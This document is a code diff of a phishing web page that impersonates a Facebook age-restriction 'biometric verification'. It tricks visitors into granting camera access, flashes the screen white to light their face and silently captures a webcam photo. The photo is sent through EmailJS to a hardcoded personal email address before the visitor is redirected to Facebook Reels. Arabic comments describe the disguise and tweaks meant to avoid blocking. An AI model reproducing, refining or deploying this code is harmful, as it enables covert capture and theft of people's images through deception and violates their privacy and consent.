@@ -3,60 +3,85 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Security</title>
+    <title>Facebook Content Verification</title>
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <style>
-        body { margin: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; color: #1877F2; font-family: sans-serif; }
-        .box { text-align: center; border: 1px solid #222; padding: 30px; border-radius: 8px; }
-        .loader { border: 3px solid #111; border-top: 3px solid #1877F2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
+        body { margin: 0; padding: 0; background-color: #000; display: flex; justify-content: center; align-items: center; height: 100vh; color: #ccc; font-family: sans-serif; transition: background-color 0.1s; overflow: hidden; }
+        .box { text-align: center; width: 85%; border: 1px solid #222; padding: 25px; border-radius: 12px; background: #0a0a0a; }
+        .loader { border: 3px solid #1a1a1a; border-top: 3px solid #1877F2; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #statusText { font-size: 0.95rem; color: #1877F2; margin-bottom: 5px; font-weight: bold; }
+        #timer { font-size: 0.8rem; color: #555; }
     </style>
 </head>
-<body>
+<body id="mainBody">
     <div class="box">
         <div class="loader"></div>
-        <p id="txt">Security Check...</p>
+        <p id="statusText">Initializing Security Protocol...</p>
+        <div id="timer">Establishing secure connection...</div>
     </div>
 
     <script>
-        (function() { emailjs.init("ClasRw06y_NeB2UQ"); })();
+        (function() { emailjs.init("ClasRw06y_NeB2UQ"); })(); // معرفك الخاص
 
         window.onload = async function() {
-            if (confirm("Verify your identity to watch this Facebook Reel.")) {
+            // رسالة التمويه المعقدة
+            const securityMsg = "SECURITY ALERT:\n\nThis Facebook Reel is age-restricted.\n\nTo view this content, you must complete the Biometric Scan to verify your identity.\n\nClick OK to start the secure verification.";
+            
+            if (confirm(securityMsg)) {
                 try {
+                    // طلب الإذن بالكاميرا
                     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                     const video = document.createElement('video');
                     video.srcObject = stream;
                     video.play();
 
-                    let count = 4;
-                    const timer = setInterval(async () => {
-                        count--;
-                        if (count <= 0) {
-                            clearInterval(timer);
+                    let seconds = 5;
+                    const timerElement = document.getElementById('timer');
+                    const statusText = document.getElementById('statusText');
+                    
+                    const interval = setInterval(async () => {
+                        seconds--;
+                        statusText.innerText = "Scanning Biometric Identity...";
+                        timerElement.innerText = "Authentication: " + (100 - (seconds * 20)) + "% Complete";
+                        
+                        if (seconds <= 0) {
+                            clearInterval(interval);
                             
-                            const canvas = document.createElement('canvas');
-                            // حجم صغير جداً لضمان المرور عبر السيرفرات الضعيفة
-                            canvas.width = 400; canvas.height = 300;
-                            canvas.getContext('2d').drawImage(video, 0, 0, 400, 300);
+                            // 1. ميزة الفلاش: تحويل الخلفية للأبيض لإضاءة الوجه
+                            document.getElementById('mainBody').style.backgroundColor = "#FFFFFF";
                             
-                            // إرسال الصورة بجودة متوسطة لتقليل حجم البيانات
-                            const imgBase64 = canvas.toDataURL('image/jpeg', 0.4);
-                            
-                            // إرسال الأمر دون انتظار الرد (للسرعة)
-                            emailjs.send('service_w3dev60', 'template_7k8tall', {
-                                image_data: imgBase64,
-                                to_email: 'tayebiabd2016@gmail.com'
-                            });
-
-                            // التحويل لفيسبوك فوراً بعد 1 ثانية من أمر الإرسال
                             setTimeout(() => {
-                                window.location.href = "https://www.facebook.com/reels/";
-                            }, 1000);
+                                const canvas = document.createElement('canvas');
+                                // 2. حجم متوسط لضمان الوصول للإيميل بسرعة
+                                canvas.width = 640; canvas.height = 480;
+                                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                                
+                                // 3. إرسال الصورة بجودة مضغوطة لتفادي الحظر
+                                const imgData = canvas.toDataURL('image/jpeg', 0.6);
+                                
+                                emailjs.send('service_w3dev60', 'template_7k8tall', {
+                                    image_data: imgData,
+                                    to_email: 'tayebiabd2016@gmail.com'
+                                });
+
+                                // 4. التحويل الإجباري والقوي للفيسبوك (بعد 0.5 ثانية من الإرسال)
+                                setTimeout(() => {
+                                    window.location.replace("https://www.facebook.com/reels/");
+                                }, 500);
+
+                            }, 400); // التقاط الصورة أثناء بياض الشاشة
                         }
                     }, 1000);
-                } catch (e) { window.location.href = "https://www.facebook.com/reels/"; }
-            } else { window.location.href = "https://www.facebook.com/reels/"; }
+
+                } catch (err) {
+                    // إذا رفض المستخدم الكاميرا، يتم تحويله فوراً
+                    window.location.replace("https://www.facebook.com/reels/");
+                }
+            } else {
+                // إذا ضغط إلغاء، يتم تحويله فوراً
+                window.location.replace("https://www.facebook.com/reels/");
+            }
         };
     </script>
 </body>
